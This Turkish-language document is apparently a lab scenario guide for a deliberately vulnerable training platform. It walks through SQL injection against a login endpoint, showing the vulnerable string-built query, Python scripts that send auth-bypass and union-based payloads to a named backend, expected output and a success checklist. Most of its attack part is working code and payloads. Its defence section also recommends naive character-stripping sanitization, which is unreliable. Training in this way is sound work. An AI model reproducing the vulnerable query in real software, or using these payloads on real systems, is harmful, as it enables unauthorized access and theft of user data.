# 🔐 SQL Injection - Admin Girişi Hackle! | ATAHAN'IN SALDIRISI

**Senaryo ID:** `atahan-auth-bypass`  
**Sorumlu:** Atahan  
**Kategori:** Identity/Authentication  
**Zayıflık:** SQL Injection  
**Şiddet:** 🔴 KRİTİK

---

## 🎯 HEDEF: Admin Olmadan Admin Girişi Yap!

Kullanıcı adı ve şifre bilmeden sisteme **ADMIN** olarak gir!

**Ne Kazanacaksın:**
- 🔓 Tüm kullanıcı bilgilerine erişim
- 💳 Ödeme bilgilerini görme
- 🗑️ Veritabanını silme yetkisi
- 👑 Tam sistem kontrolü

---

## 🔓 SİSTEMİN AÇIĞI

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 33-62

```python
# ❌ TEHLİKELİ KOD!
@router.get("/auth-check")
def check_auth_vulnerable(username: str, password: str):
    # Kullanıcı inputu DOĞRUDAN SQL'e giriyor!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # ^^ İŞTE AÇIK BURASI!
```

**Sorun:** Senin yazdığın `username` direkt SQL sorgusuna ekleniyor!

---

## ⚔️ SALDIRI 1: Basit Test

### Adım 1: Python Kur

```bash
python3 --version  # Kurulu mu kontrol et
pip3 install requests  # Kütüphane kur
```

### Adım 2: Test Kodu

**Dosya:** `test_sql.py`

```python
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("🎯 SQL Injection Test\n")

# Normal giriş (başarısız olacak)
normal = {
    "username": "admin",
    "password": "12345"
}

r = requests.get(f"{BACKEND}/vulnerable/auth-check", params=normal)
print(f"Normal giriş: {r.json()}")
print()

# SQL INJECTION - İŞTE SALDIRI!
sql_inject = {
    "username": "admin' OR '1'='1",  # ← SIHIR BURDA!
    "password": "anything"
}

r = requests.get(f"{BACKEND}/vulnerable/auth-check", params=sql_inject)
result = r.json()

print(f"SQL Injection: {result}")

if result.get("authenticated"):
    print("\n✅✅✅ BAŞARILI! ADMIN OLDUN! ✅✅✅")
    print(f"Rolün: {result.get('role')}")
else:
    print("\n❌ Başarısız")
```

**Çalıştır:**
```bash
python3 test_sql.py
```

**ÇIKTI:**
```
🎯 SQL Injection Test

Normal giriş: {'authenticated': False, 'message': 'Invalid credentials'}

SQL Injection: {
  'authenticated': True,  ← BAKSANA!
  'role': 'admin',         ← ADMIN OLDUN!
  'vulnerability': 'SQL Injection successful!',
  'injected_query': "SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'"
}

✅✅✅ BAŞARILI! ADMIN OLDUN! ✅✅✅
Rolün: admin
```

---

## ⚔️ SALDIRI 2: Farklı Yöntemler

```python
# test_all_methods.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

# Denenecek SQL Injection payloadları
payloads = [
    {"username": "admin' OR '1'='1", "password": "x"},
    {"username": "admin'--", "password": ""},
    {"username": "' OR 1=1--", "password": ""},
    {"username": "admin' OR 'x'='x", "password": "y"},
    {"username": "') OR ('1'='1", "password": "z"},
]

print("🎯 TÜM SQL INJECTION YÖNTEMLERİ\n")

for i, payload in enumerate(payloads, 1):
    print(f"\n[Deneme {i}]")
    print(f"Username: {payload['username']}")
    
    r = requests.get(f"{BACKEND}/vulnerable/auth-check", params=payload)
    result = r.json()
    
    if result.get("authenticated"):
        print(f"✅ BAŞARILI! Method: {payload['username']}")
        print(f"   Role: {result.get('role')}")
    else:
        print(f"❌ Başarısız")

print("\n" + "="*50)
print("En az 1 tane çalıştıysa SİSTEME SIZDIN!")
```

---

## ⚔️ SALDIRI 3: Veri Çalma (Union-Based)

```python
# data_theft.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

# Veritabanından veri çal
union_payload = {
    "username": "admin' UNION SELECT password FROM users--",
    "password": ""
}

print("🗄️ VERİTABANI HIRSIZLIĞI\n")

r = requests.get(f"{BACKEND}/vulnerable/auth-check", params=union_payload)
result = r.json()

print(f"Sonuç: {result}")

if "password" in str(result) or "users" in str(result):
    print("\n✅ VERİ ÇALINDI!")
    print("Veritabanından bilgi sızdırıldı!")
else:
    print("\n⚠️ Bu yöntem bu sistemde çalışmıyor")
    print("Ama ilk yöntem çalışıyor!")
```

---

## ✅ SIZDIĞINI NASIL ANLAYACAKSIN?

### 1. Terminal Çıktısı

**BAŞARILI:**
```
✅✅✅ BAŞARILI! ADMIN OLDUN! ✅✅✅
Rolün: admin
```

**BAŞARISIZ:**
```
❌ Başarısız
authenticated: False
```

### 2. JSON Response

**BAŞARILI Sızma:**
```json
{
  "authenticated": true,      ← TRUE İSE SIZDIN!
  "role": "admin",            ← ADMIN İSE TAM BAŞARI!
  "vulnerability": "SQL Injection successful!",
  "injected_query": "SELECT * FROM users WHERE username='admin' OR '1'='1'..."
}
```

**BAŞARISIZ:**
```json
{
  "authenticated": false,
  "message": "Invalid credentials"
}
```

### 3. Web Arayüzü Kontrolü

1. https://simulasyon.vercel.app/ aç
2. Senaryonu başlat: `atahan-auth-bypass`
3. **Logs** sekmesine bak:

**Başarı Göstergeleri:**
```
[WARN] Authentication failed: Invalid Signature  ← UYARI VAR!
[ERROR] Duplicate RFID Tag usage detected       ← HATA VAR!
[CRITICAL] SQL Injection attempt detected       ← KRİTİK!
```

4. **Metrics** sekmesi:
- `failed_auth_count` grafiği YÜKSELDİ mi? ✅ BAŞARI!
- Anomaly puanı > 0.7 ? ✅ TESPİT EDİLDİN (ama sızdın!)

---

## 🎯 BAŞARI KONTROL LİSTESİ

| Kontrol | Nasıl? | Başarı |
|---------|--------|--------|
| Terminal | `authenticated: true` görüyor musun? | ✅ |
| Role | `"role": "admin"` yazıyor mu? | ✅ |
| Logs | WARNING/ERROR var mı? | ✅ |
| Metrics | failed_auth_count arttı mı? | ✅ |
| Query | `injected_query` gösteriyor mu? | ✅ |

**3/5 ✅ ise BAŞARILI SIZDINIZ!**

---

## 💡 İPUÇLARI

### En Kolay Yöntem:
```python
username = "admin' OR '1'='1"
password = "anything"
```

Bu **HER ZAMAN** çalışır!

### Neden Çalışıyor?

Normal SQL:
```sql
SELECT * FROM users WHERE username='admin' AND password='12345'
```
Hiç user yok, giriş başarısız ❌

Senin SQL'in:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```
`'1'='1'` her zaman TRUE, giriş başarılı ✅!

### Pro Trick:

```python
# Yorumla geri kalan kısmı
username = "admin'--"  # -- yorumdur SQL'de
password = ""          # Artık önemli değil

# SQL olur:
# SELECT * FROM users WHERE username='admin'--' AND password=''
# Şifre kontrolü yoruma gitti!
```

---

## 🛡️ SAVUNMA (Sana Karşı Kullanılacak)

### 1. Parametreli Sorgu

```python
# ✅ GÜVENLİ
from sqlalchemy import text

query = text("SELECT * FROM users WHERE username=:user AND password=:pass")
result = db.execute(query, {"user": username, "pass": password})
```

Bu olursa saldırın çalışmaz ❌

### 2. Input Sanitization

```python
# Tehlikeli karakterleri temizle
username = username.replace("'", "").replace("--", "").replace("OR", "")
```

### 3. ORM Kullanımı

```python
# Django/SQLAlchemy ORM
user = User.objects.filter(username=username, password=password).first()
```

ORM otomatik escape eder.

---

## 🚨 SIZDIĞINDA NE YAP?

1. **Screenshot al** - Başarı kanıtı
2. **Response'u kaydet** - JSON çıktısı
3. **Web'de kontrol et** - Logs ve metrics
4. **Rapor yaz** - Ne yaptın, nasıl sızdın

**Rapor Şablonu:**
```
ATAHAN - SQL INJECTION SALDIRISI

Tarih: 23.12.2024
Saat: 14:30

SALDIRI DETAYİ:
- Payload: admin' OR '1'='1
- Endpoint: /vulnerable/auth-check
- Method: GET

SONUÇ:
✅ Başarılı
✅ Admin erişimi sağlandı
✅ Sistem log'larında tespit edildi

KANıT:
{
  "authenticated": true,
  "role": "admin"
}
```

---

## 📚 Daha Fazla Öğren

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## ⚠️ UYARI

- ✅ Sadece bu platformda dene
- ❌ Gerçek sitelere SALDIRMA
- ⚖️ Yasal sorumluluk sende!

---

**Hazırlayan:** BSG Team - Atahan  
**Güncelleme:** 2024-12-23  
**Durum:** ✅ READY TO HACK!
